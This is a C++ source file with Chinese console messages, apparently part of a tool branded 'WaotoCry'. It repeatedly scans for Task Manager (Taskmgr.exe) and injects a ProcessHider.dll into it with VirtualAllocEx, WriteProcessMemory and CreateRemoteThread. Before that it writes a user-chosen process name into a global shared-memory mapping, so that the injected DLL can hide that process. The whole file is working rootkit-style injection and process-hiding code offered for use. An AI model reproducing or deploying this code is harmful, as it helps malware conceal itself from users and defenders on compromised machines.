#include "Un-main.h"
#include <TlHelp32.h>

HANDLE map;
LPVOID buf;

bool inject_dll(DWORD pid, string dll_path) {

	HANDLE handle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
	if (handle == INVALID_HANDLE_VALUE) {
		cout << " WaotoCry内核操作模块[-] 打开进程失败" << endl;
		return false;
	}
	else { cout << "WaotoCry内核操作模块[+] 获得远程进程的句柄" << endl; }

	LPVOID address = VirtualAllocEx(handle, NULL, dll_path.length(), MEM_COMMIT | MEM_RESERVE,
		PAGE_EXECUTE_READWRITE);
	if (address == NULL) {
		cout << " [-] 调用VirtualAllocEx失败" << endl;
		return false;
	}

	bool res = WriteProcessMemory(handle, address, dll_path.c_str(), dll_path.length(), 0);
	if (!res) {
		cout << " WaotoCry内核操作模块[-] 调用WriteProcessMemory失败" << endl;
	}
	if (CreateRemoteThread(handle, NULL, NULL, (LPTHREAD_START_ROUTINE)LoadLibraryA, (LPVOID)address, NULL, NULL) == INVALID_HANDLE_VALUE) {
		cout << " WaotoCry内核操作模块[-] 调用CreateRemoteThread失败" << endl;
	}
	else { cout << " [+] 加载到远程进程中的DLL成功!" << endl; }

	cout << " WaotoCry内核操作模块[+] Process Hidden" << endl << endl;
	CloseHandle(handle);
	return true;
}

void find_and_inject()
{
	char* dll_path_c = (char*)malloc(sizeof(char) * 3000);
	GetModuleFileNameA(NULL, dll_path_c, 3000);

	DWORD lastpid = 4;
	string dll_path(dll_path_c);
	size_t index = dll_path.find_last_of('\\');
	dll_path.erase(dll_path.begin() + index, dll_path.end());
	dll_path.append("\\ProcessHider.dll");
	cout << dll_path << endl;
	while (true) {
		PROCESSENTRY32 process;
		process.dwSize = sizeof(PROCESSENTRY32);

		HANDLE proc_snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
		if (proc_snap == INVALID_HANDLE_VALUE) {
			cout << " WaotoCry内核操作模块[-] 调用CreateToolhelp32Snapshot失败" << endl;
			return;
		}

		if (!Process32First(proc_snap, &process)) {
			cout << " WaotoCry内核操作模块[-] 调用Process32First失败" << endl;
			return;
		}

		do
		{
			if (!lstrcmp(process.szExeFile, "Taskmgr.exe") && lastpid != process.th32ProcessID) {
				cout << " [+] 检测到任务管理器" << endl;
				if (!inject_dll(process.th32ProcessID, dll_path)) {
					cout << " [-] 无法插入DLL！！检查您是否以管理员身份运行" << endl << endl;
					break;
				}
				lastpid = process.th32ProcessID;
			}
		} while (Process32Next(proc_snap, &process));
		CloseHandle(proc_snap);
		Sleep(1000);
	}
}

bool map_process_name(string process) {
	map = CreateFileMappingA(
		INVALID_HANDLE_VALUE,
		NULL,
		PAGE_READWRITE,
		0,
		255,
		"Global\\GetProcessName"
	);

	if (map == NULL) {
		cout << "调用CreateFileMapping 失败" << endl;
		return false;
	}

	buf = MapViewOfFile(map,
		FILE_MAP_ALL_ACCESS,
		0,
		0,
		255);

	if (buf == NULL) {
		cout << "MapViewOfFile 失败" << endl;
		CloseHandle(map);
		return 0;
	}

	CopyMemory(buf, process.c_str(), process.length());
}

int hide_process()
{
	string process, inp;
	cout << " [WaotoCry内核操作模块-0x7E9FB -SeCurity Team]" << endl;
	cout << "输入要隐藏的进程名称" << endl << "--> ";
	cin >> process;
	cout << endl;
	map_process_name(process);

	CreateThread(
		NULL,
		NULL,
		(LPTHREAD_START_ROUTINE)find_and_inject,
		NULL,
		NULL,
		NULL
	);

	cout << "确认 \"退出\" 退出或保持此运行以注入任务管理器进程" << endl << endl;
	while (true) {
		cin >> inp;
		if (inp == "quit") {
			UnmapViewOfFile(buf);
			CloseHandle(map);
			ExitProcess(0);
		}
	}

	return 0;
}

